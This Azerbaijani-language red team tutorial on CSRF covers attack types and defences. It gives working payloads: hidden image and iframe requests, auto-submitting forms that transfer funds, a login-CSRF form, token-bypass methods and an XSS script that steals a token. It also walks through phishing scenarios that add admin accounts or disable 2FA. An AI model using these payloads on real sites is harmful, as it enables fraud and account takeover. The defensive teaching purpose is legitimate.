# 🔴 CSRF Hücumları — Red Team Təlim Materialı
**Azərbaycanca | Səviyyə: Başlanğıc → Orta**

---

## 📌 CSRF Nədir?

**CSRF (Cross-Site Request Forgery)** — haker qurbanın brauzerini istifadə edərək, qurbanın adından **icazəsiz HTTP sorğusu göndərməsini** təmin edən hücum növüdür.

Sadə dillə: Qurban bir sayta daxil olub (məsələn, bank), sessiyası açıqdır. Haker qurbana başqa bir link göndərir. Qurban o linki açanda — **özü bilmədən** bank hesabından pul köçürür.

> 💡 **Əsas problem:** Brauzer hər HTTP sorğusuna həmin saytın cookie-lərini **avtomatik əlavə edir**. Server isə sorğunun həqiqi istifadəçidən gəlib-gəlmədiyini bilmir — yalnız cookie-yə baxır.

**XSS ilə fərqi:**
| | XSS | CSRF |
|---|---|---|
| **Hücum yeri** | Qurbanın brauzerindəki kod | Qurban adından göndərilən sorğu |
| **Nə lazımdır** | Saytda XSS zəifliyi | Qurbanın aktiv sessiyası |
| **Məqsəd** | Məlumat oğurluğu, hesab ələ keçirmə | Qurban adından hərəkət etmək |
| **Sayt zəifliyi** | Var | Olmaya bilər — sayt normal işləyir |

---

## 🧠 Necə İşləyir? — Brauzerin "Günahı"

Brauzerlərin bir qaydası var: **Same-Origin Policy (SOP)** — başqa saytdan gələn JavaScript o saytın məlumatını oxuya bilmir. Amma bu qayda **sorğu göndərməyi** əngəlləmir — yalnız cavabı oxumağı əngəlləyir.

```
Qurban bank.com-a daxil olub → sessiya cookie-si var

Haker evil.com-dan belə bir sorğu göndərir:
POST https://bank.com/transfer
Cookie: session=abc123  ← Brauzer bunu AVTOMATIK əlavə edir!
Body: to=haker&amount=5000

Bank server cookie-ni görür → "Bu istifadəçidir" deyir → pul köçürür
```

Brauzer SOP-a görə bank.com-un cavabını evil.com-a vermir, amma **sorğu göndərmənin özü baş verir** — bank pulu köçürür.

---

## 🗂️ CSRF Növləri

---

### 1. 🟡 GET-based CSRF

**Necə işləyir?**
Sayt vacib hərəkətlər üçün GET metodundan istifadə edirsə (yəni URL-də parametrlər), hücum çox sadədir. Bir şəkil taqı, iframe və ya sadə link kifayət edir.

**Zəif sayt nümunəsi:**
```
GET https://bank.com/transfer?to=alice&amount=100
```
Bu URL açılanda köçürmə baş verir.

**Hücum:**
```html
<!-- Qurban evil.com-u açanda bu şəkil "yüklənir" -->
<!-- Brauzer GET sorğusu atar, bank.com cookie-si əlavə olunur -->
<img src="https://bank.com/transfer?to=haker&amount=5000" width="0" height="0">

<!-- Və ya iframe ilə: -->
<iframe src="https://bank.com/delete_account?confirm=yes" style="display:none"></iframe>
```

Qurban heç nə görmür — şəkil 0x0 pixel, amma sorğu gedir.

---

### 2. 🔴 POST-based CSRF

**Necə işləyir?**
Sayt GET əvəzinə POST işlədəndə hücum bir az mürəkkəbləşir, amma HTML forması avtomatik submit edə bildiyi üçün bu da asanlıqla həll olunur.

**Nümunə — Avtomatik Submit olunan Forma:**
```html
<!-- evil.com-dakı gizli HTML səhifəsi -->
<html>
  <body>
    <!-- Forma qurbanın görmədən submit olunur -->
    <form id="csrf_form" action="https://bank.com/transfer" method="POST">
      <input type="hidden" name="to" value="haker_hesabi">
      <input type="hidden" name="amount" value="10000">
      <input type="hidden" name="currency" value="AZN">
    </form>

    <script>
      // Səhifə açılandan dərhal formanı submit et
      document.getElementById("csrf_form").submit();
    </script>
  </body>
</html>
```

Qurban linki açır → görünən heç nə yoxdur → arxa planda forma submit olunur → bank köçürməni həyata keçirir.

---

### 3. 🔵 JSON-based CSRF

**Necə işləyir?**
Müasir API-lər JSON formatında POST sorğuları qəbul edir. `Content-Type: application/json` olan sorğuları adi HTML forması göndərə bilmir. Amma bəzi yollar var.

**Bəzi saytlar Content-Type yoxlamır:**
```html
<!-- text/plain ilə göndər — bəzi saytlar qəbul edir -->
<form action="https://api.example.com/update_email" method="POST" enctype="text/plain">
  <!-- name="key" value="value" → "key=value" kimi göndərilir -->
  <!-- Hiyləgər formatlaşdırma ilə JSON kimi görünə bilər -->
  <input type="hidden" name='{"email":"haker@evil.com","dummy":"' value='"}'>
</form>
```

**XSS + CSRF kombinasiyası (ən güclü):**
```javascript
// Əgər saytda XSS varsa — fetch() ilə JSON CSRF tam mümkündür
fetch('https://victim.com/api/change_email', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'haker@evil.com'}),
  credentials: 'include'  // Cookie-ləri əlavə et
});
```

---

### 4. 🟠 Flash-based CSRF (Köhnə, amma bilinməli)

Flash Player silindikdən sonra demək olar yox olub, amma köhnə sistemlərdə hələ rastlanır. Flash `crossdomain.xml` faylı sərbəst konfiqurasiya olunmuşsa, cross-origin sorğu göndərə bilirdi.

---

### 5. 🔴 Login CSRF

**Necə işləyir?**
Ən az bilinən növdür. Haker qurbanı **hakerin öz hesabına** login etdirir. Qurban həmin hesabda fəaliyyət göstərir — axtarış tarixçəsi, alışlar, yazılanlar — haker bunları görür.

```html
<!-- Qurbanı hakerin hesabına login etdirmək -->
<form action="https://example.com/login" method="POST">
  <input type="hidden" name="username" value="haker@evil.com">
  <input type="hidden" name="password" value="hakerin_sifresi">
</form>
<script>document.forms[0].submit()</script>
```

**Real dünyada nə olur:**
```
1. Qurban Google ilə axtarış edir → tarixçə hakerin hesabına yazılır
2. Qurban kredit kartını saxlayır → haker görür
3. Qurban şəxsi məlumat daxil edir → haker əldə edir
```

---

## 🔍 CSRF Token Nədir və Necə Bypass Edilir?

### CSRF Token Necə İşləyir?
```
1. İstifadəçi forma açır
2. Server random bir token yaradır: "csrf_abc123xyz"
3. Bu token formaya gizli sahə kimi əlavə edilir
4. İstifadəçi formanı göndərəndə token də gedib
5. Server token-i yoxlayır: uyğundursa → icra et, yoxdursa → rədd et

Haker evil.com-dan bu token-i bilmir → CSRF mümkün deyil
```

### Token Bypass Texnikaları

**1. Token-i tamamilə sil:**
```http
POST /transfer HTTP/1.1

to=haker&amount=5000
# csrf_token parametrini sil
# Bəzi saytlar token olmadıqda yoxlamır!
```

**2. Token-i boş burax:**
```
csrf_token=
# Bəzi saytlar boş token-i qəbul edir
```

**3. Öz token-ini istifadə et:**
```
# Öz hesabından csrf_token=menim_tokenim al
# Bəzi saytlar token-in kimin olduğunu yoxlamır, yalnız formatı yoxlayır
csrf_token=menim_tokenim
```

**4. Başqa metod istifadə et:**
```http
# Sayt POST-u qoruya bilər, amma GET-i qorumazsa:
GET /transfer?to=haker&amount=5000
# Metod dəyişikliyi bypass-a yol aça bilər
```

**5. Referrer yoxlamasını bypass et:**
```http
# Bəzi saytlar CSRF token əvəzinə Referrer header yoxlayır
# Null Referrer göndər:
<meta name="referrer" content="no-referrer">
<form ...>

# Və ya Referrer-i saxta göstər:
# URL-ə hədəf saytını əlavə et:
https://evil.com/?https://bank.com/
```

**6. XSS ilə Token Oğurla:**
```javascript
// Saytda XSS varsa — token artıq problem deyil
// Əvvəlcə token-i oxu, sonra sorğu göndər
fetch('/transfer_form')
  .then(r => r.text())
  .then(html => {
    // Səhifədən token-i çıxart
    const token = html.match(/csrf_token" value="([^"]+)"/)[1];
    
    // Token ilə sorğu göndər
    return fetch('/transfer', {
      method: 'POST',
      body: `to=haker&amount=5000&csrf_token=${token}`,
      credentials: 'include'
    });
  });
```

---

## 🎯 CSRF Test Metodologiyası

### Mərhələ 1: Hərəkət Nöqtələrini Tap
```
Bütün state-dəyişdirən əməliyyatları tap:
□ Şifrə dəyişmə
□ Email dəyişmə
□ Pul köçürmə / ödəmə
□ Hesab silmə
□ Admin hərəkətləri (istifadəçi əlavə/sil)
□ Parametr dəyişmə (email notifikasiya, 2FA on/off)
□ Dostluq/follow əməliyyatları
□ Post/şərh əlavə etmə
```

### Mərhələ 2: CSRF Müdafiəsini Yoxla
```
Hər sorğu üçün:
□ CSRF token varmı?
□ Token server tərəfindən yoxlanılırmı?
□ SameSite cookie attributu varmı?
□ Origin / Referrer yoxlaması varmı?
□ Custom header tələb olunurmu? (X-Requested-With)
```

### Mərhələ 3: Burp Suite ilə Test
```
1. Burp Proxy ilə sorğunu tut (intercept)
2. Sağ klik → "Engagement tools" → "Generate CSRF PoC"
3. Burp avtomatik HTML PoC yaradır
4. Brauzerdə aç, test et
```

### Mərhələ 4: Proof of Concept Yaz
```html
<!-- Minimal CSRF PoC şablonu -->
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
  <h1>Yüklənir...</h1>
  <form id="f" action="https://TARGET.com/ACTION" method="POST">
    <input type="hidden" name="param1" value="value1">
    <input type="hidden" name="param2" value="value2">
  </form>
  <script>document.getElementById('f').submit();</script>
</body>
</html>
```

---

## 🛠️ CSRF Alətləri

| Alət | İstifadə |
|------|----------|
| **Burp Suite** | CSRF PoC generator, intercept |
| **CSRF Tester** | Avtomatik CSRF test |
| **XSRFProbe** | CSRF audit framework |
| **Postman** | Manual API testi |

---

## ⚔️ Real Dünya Ssenariləri

### Ssenari 1: Bank Köçürməsi
```
Hədəf: bank.az
Zəiflik: /transfer POST endpoint-i CSRF token yoxlamır

Hücum:
1. evil.com-da gizli HTML forma yerləşdir
2. Qurbana "Mükəmməl uduş qazandın!" emaili göndər
3. Qurban linki açır → forma submit olunur
4. bank.az-ın session cookie-si əlavə olunur
5. 500 AZN haker hesabına köçürülür
```

### Ssenari 2: Admin Hesabı Ələ Keçirmə
```
Hədəf: cms.example.com (admin panel)
Zəiflik: /admin/create_user endpoint-i

Hücum:
1. Admin-ə saxta email göndər ("Sistem bildirişi")
2. Admin linki açır → arxa planda:
   POST /admin/create_user
   username=haker&password=Pass123&role=admin
3. Haker admin hesabı yaranır
4. Haker birbaşa login edir
```

### Ssenari 3: 2FA-nı Söndürmə
```
Hücum sırası:
1. Qurbanın email-inə phishing göndər
2. Qurban linki açır → CSRF sorğusu:
   POST /settings/2fa/disable
3. İki faktorlu autentifikasiya söndürülür
4. Haker parolu bilsə — birbaşa giriş
```

### Ssenari 4: Sosial Media Yayılma (Worm)
```
1. Haker sosial media saytında CSRF zəifliyi tapır
   POST /post/share  → token yoxlanmır

2. Zərərli paylaşım yaradır:
   "Bu videoya bax! → evil.com/video"

3. evil.com-da:
   - Qurban səhifəni açır
   - Avtomatik o da "Bu videoya bax!" paylaşır
   - Onun dostları da görür → onlar da açır
   → Sonsuz zəncir — CSRF Worm!

Real nümunə: 2008-ci ildə MySpace "Samy" wormu
(XSS + CSRF kombinasiyası ilə 1 milyon hesabı yoluxdurdu)
```

---

## 🛡️ Müdafiə Tədbirləri (Blue Team)

### 1. CSRF Token (Ən Effektiv)
```python
# Server tərəfindən token yaratma (Python Flask nümunəsi)
import secrets

@app.route('/transfer', methods=['GET'])
def transfer_form():
    token = secrets.token_hex(32)
    session['csrf_token'] = token
    return render_template('transfer.html', csrf_token=token)

@app.route('/transfer', methods=['POST'])
def transfer():
    if request.form['csrf_token'] != session['csrf_token']:
        abort(403)  # Rədd et
    # Köçürmə əməliyyatı...
```

### 2. SameSite Cookie
```http
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly

# SameSite=Strict  → Cookie yalnız eyni saytdan göndərilir (ən güclü)
# SameSite=Lax    → GET üçün cross-site icazə var, POST üçün yox
# SameSite=None   → Hər yerdən göndərilir (köhnə davranış, CSRF-ə açıqdır)
```

### 3. Origin / Referrer Yoxlama
```python
@app.before_request
def check_origin():
    if request.method == 'POST':
        origin = request.headers.get('Origin')
        if origin and origin != 'https://mysite.com':
            abort(403)
```

### 4. Double Submit Cookie
```
1. Server random token yaradır: "token123"
2. Həm cookie-yə, həm forma sahəsinə əlavə edir
3. Sorğu gəldiqdə: cookie token == forma token?
4. Haker cookie-ni bilmir → uyğunlaşdıra bilmir
```

### 5. Custom Header Tələb Et
```javascript
// Client hər sorğuya custom header əlavə edir
fetch('/api/transfer', {
  headers: {
    'X-Requested-With': 'XMLHttpRequest'
    // Adi HTML forması bu headeri göndərə bilmir
  }
})
// Server bu headerin varlığını yoxlayır
```

---

## 📊 CSRF Müdafiə Mexanizmlərinin Müqayisəsi

| Mexanizm | Effektivlik | Mürəkkəblik | Qeyd |
|----------|-------------|-------------|------|
| CSRF Token | 🔴 Çox yüksək | Orta | Standart üsul |
| SameSite=Strict | 🔴 Çox yüksək | Aşağı | Müasir brauzerlər |
| SameSite=Lax | 🟡 Orta | Aşağı | GET CSRF-ə açıqdır |
| Referrer yoxlama | 🟡 Orta | Aşağı | Bypass mümkündür |
| Double Submit | 🟠 Yüksək | Orta | Subdomain XSS varsa zəifdir |
| Custom Header | 🟠 Yüksək | Aşağı | Yalnız AJAX üçün |

---

## 🔗 CSRF + Digər Hücumlarla Kombinasiya

### CSRF + XSS = Tam Nəzarət
```
1. Saytda Stored XSS tap
2. XSS payload-u CSRF token-i oxuyur
3. Token ilə istənilən əməliyyatı icra et
→ CSRF müdafiəsini tamamilə keçirsən
```

### CSRF + Clickjacking
```
1. Haker öz saytında bank.az-ı invisible iframe-ə yerləşdirir
2. Üstünə cəlbedici düymə qoyur: "Mükafat al!"
3. Qurban düyməyə klikləyir → əslində bank.az-ın "Köçür" düyməsinə basır
4. CSRF token var, amma qurban özü kliklədi → keçir!
```

### CSRF + Open Redirect
```
Saytda açıq redirect var:
example.com/redirect?url=https://evil.com

CSRF token Referrer-ə əsaslanırsa:
Sorğunun Referrer-i: https://example.com/redirect?url=evil.com
→ Sayt "Referrer example.com-dur" deyib qəbul edir
→ Amma real mənbə evil.com-dur
```

---

## 🏁 Öyrənmə Yolu

```
1️⃣  PortSwigger Web Security Academy
    → CSRF mövzusu: portswigger.net/web-security/csrf
    → 12+ praktik lab

2️⃣  DVWA (Damn Vulnerable Web App)
    → CSRF bölməsi — 3 çətinlik səviyyəsi

3️⃣  HackTheBox / TryHackMe
    → Real ssenari məşqləri

4️⃣  Burp Suite Pro
    → CSRF PoC Generator ilə məşq

5️⃣  Bug Bounty
    → HackerOne-da "CSRF" ilə axtarış
    → Digərlərin report-larını oxu → öyrən
```

---

## ⚠️ Qanuni Xəbərdarlıq

Öyrəndiklərini **yalnız**:
- Öz qurduğun test mühitlərində (DVWA, WebGoat)
- İcazə verilmiş bug bounty proqramlarında
- İmzalanmış pentest müqaviləsi olan sistemlərdə

tətbiq et. İcazəsiz sistemlərə hücum **cinayət məsuliyyəti** daşıyır.

---

*📝 Hazırlandı: Red Team Təlim Materialı | CSRF — Orta Səviyyə | v1.0*
